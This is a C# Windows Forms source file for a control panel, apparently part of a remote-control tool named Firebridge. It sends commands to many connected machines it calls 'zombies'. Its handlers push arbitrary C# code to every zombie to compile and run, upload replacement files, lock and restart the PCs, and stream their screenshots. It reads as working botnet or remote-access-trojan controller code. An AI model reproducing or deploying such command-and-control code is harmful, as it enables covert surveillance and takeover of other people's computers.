using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using FirebridgeShared.Networking;
using FirebridgeShared.Models;
using System.IO;
using FirebridgeClient.Views;
using System.Linq;

namespace FirebridgeClient.Controls
{
    public partial class ZombieActionsBar : UserControl
    {
        public CodeEditor CodeEditor { get; set; } = new CodeEditor();
        public ICollection<ZombieView> zombieViews { get; set; }
        public ZombieActionsBar()
        {
            InitializeComponent();

            Disposed += ZombieActionsBar_Disposed;

            _refreshRate.Text = "Refresh: " + (_refreshRateBar.Value) + "FPS";
            _resolution.Text = "Resolution: " + (128 * _resolutionBar.Value) + "x" + (72 * _resolutionBar.Value);

            _refreshRate.ForeColor = ColorTranslator.FromHtml("#f7f1e3");
            _resolution.ForeColor = ColorTranslator.FromHtml("#f7f1e3");
        }

        private void ZombieActionsBar_Disposed(object sender, EventArgs e)
        {
            CodeEditor.Dispose();
        }

        private void _identifyPC_Click(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
            {
                zombie.SendPacket(new Packet()
                {
                    Id = 1,
                    Data = new MiniProgramModel()
                    {
                        Code = @"   using System;
                                    using System.Drawing;
                                    using System.Threading;
                                    using System.Windows.Forms;
                                    using FirebridgeShared.Networking;
                                    using System.Threading.Tasks;

                                    namespace TestApp
                                    {
                                        public static class Program
                                        {
                                            public static void Main(Connection s)
                                            {
                                    Task.Run(() => {
                                                var form = new Form();
                                                form.FormBorderStyle = FormBorderStyle.None;
                                                form.WindowState = FormWindowState.Maximized;
                                                Label label = new Label();
                                                label.Text = Environment.MachineName;
                                                label.AutoSize = true;
                                                label.Font = new Font(""Microsoft Sans Serif"", 120F, FontStyle.Regular, GraphicsUnit.Point, 238);
                                                form.Controls.Add(label);
                                                form.Show();
                                    form.BringToFront();
                                                label.Location = new Point(10,10);
                                                form.Refresh();
                                                Thread.Sleep(2500); form.Dispose(); });
                                            }
                                        }
                                    }",
                        EntryPoint = "TestApp.Program",
                        References = new List<string>()
                    {
                        "System.dll", "FirebridgeShared.dll", "netstandard.dll","System.Core.dll","System.Drawing.dll","System.Windows.Forms.dll"
                    },
                    }
                });
            }
        }

        private void _updateScreenshot_Click(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.RequestScreenshot();
        }

        private void _refreshRateBar_ValueChanged(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.ScreenShotRefreshWaitTime = (int)(1000f / _refreshRateBar.Value);

            _refreshRate.Text = "Refresh: " + (_refreshRateBar.Value) + "FPS";
        }

        private void _resolutionBar_ValueChanged(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.ScreenShotResolutionMultiplier = _resolutionBar.Value;

            _resolution.Text = "Resolution: " + (128 * _resolutionBar.Value) + "x" + (72 * _resolutionBar.Value);
        }

        private void _screenshotEnabled_CheckedChanged(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie._screenshotTimer.Enabled = _screenshotEnabled.Enabled;
        }

        private void _restartPC_Click(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.SendPacket(new Packet() { Id = 8 });
        }

        private void _updateZombie_Click(object sender, EventArgs e)
        {
            if (zombieViews.Count == 0)
                return;

            var f = new OpenFileDialog();
            f.Multiselect = true;
            if (f.ShowDialog() == DialogResult.OK)
            {
                var update = new UpdateModel() { Names = new List<string>(), Data = new List<byte[]>() };
                for (int i = 0; i < f.FileNames.Length; i++)
                {
                    update.Data.Add(File.ReadAllBytes(f.FileNames[i]));
                    update.Names.Add(f.SafeFileNames[i]);

                }

                var packet = new Packet() { Id = 4, Data = update };

                foreach (var zombie in zombieViews)
                    zombie.SendPacket(packet);
            }

        }

        private void _executeCode_Click(object sender, EventArgs e)
        {
            var p = new Packet()
            {
                Id = 1,
                Data = new MiniProgramModel()
                {
                    Code = CodeEditor._tb_code.Text
                        ,
                    EntryPoint = CodeEditor._EntryPointTB.Text,
                    References = string.Concat(CodeEditor._tb_references.Text.Where(c => !char.IsWhiteSpace(c))).Split(';').ToList()
                }
            };

            foreach (var zombie in zombieViews)
                zombie.SendPacket(p);
        }

        private void _editCode_Click(object sender, EventArgs e)
        {
            CodeEditor.Show();
        }

        private void _lockPc_Click(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.SendPacket(new Packet() { Id = 7 });
        }

        private void _restartApp_Click(object sender, EventArgs e)
        {
            foreach (var zombie in zombieViews)
                zombie.SendPacket(new Packet() { Id = 2, Data = 70 });
        }
    }
}
